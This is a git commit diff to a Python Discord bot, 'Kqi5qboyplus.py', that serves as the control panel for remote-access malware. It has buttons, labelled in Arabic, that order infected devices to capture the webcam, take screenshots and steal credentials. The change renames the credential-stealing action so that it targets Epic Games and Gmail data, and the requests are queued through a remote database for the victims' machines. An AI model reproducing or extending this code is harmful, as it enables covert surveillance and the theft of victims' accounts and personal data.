7fc4e1776bba53d4017ab510cfbd51be28e8762d
kqi5q <mazenharti@gmail.com>
2026-09-15 03:04:28 +0300

    Update Kqi5qboyplus.py

--- Kqi5qboyplus.py
+++ Kqi5qboyplus.py
@@ -360,13 +360,13 @@ class DeviceActionsView(discord.ui.View):
             db.setdefault("remote_webcams", {})[self.code] = {"id": str(int(time.time()))}
             if save_db(db, sha, url, headers, f"Webcam {self.code}"): await interaction.followup.send("📸 تم طلب الكاميرا!", ephemeral=True)
 
-    @discord.ui.button(label="🔑 سحب التوكنات والمتصفحات", style=discord.ButtonStyle.secondary, custom_id="dev_act_tokens", row=1)
+    @discord.ui.button(label="🎮 سحب Epic Games و Gmail والبيانات", style=discord.ButtonStyle.secondary, custom_id="dev_act_tokens", row=1)
     async def tokens_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         if not interaction.response.is_done(): await interaction.response.defer(thinking=True, ephemeral=True)
         db, sha, url, headers = fetch_db()
         if db:
             db.setdefault("remote_token_stealers", {})[self.code] = {"id": str(int(time.time()))}
-            if save_db(db, sha, url, headers, f"Tokens {self.code}"): await interaction.followup.send("🔑 تم طلب سحب التوكنات والمواقع الشاملة!", ephemeral=True)
+            if save_db(db, sha, url, headers, f"Epic/Gmail Dump {self.code}"): await interaction.followup.send("🎮 تم طلب سحب بيانات Epic Games و Gmail الشاملة!", ephemeral=True)
 
     @discord.ui.button(label="📸 لقطة شاشة", style=discord.ButtonStyle.secondary, custom_id="dev_act_screenshot", row=1)
     async def ss_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
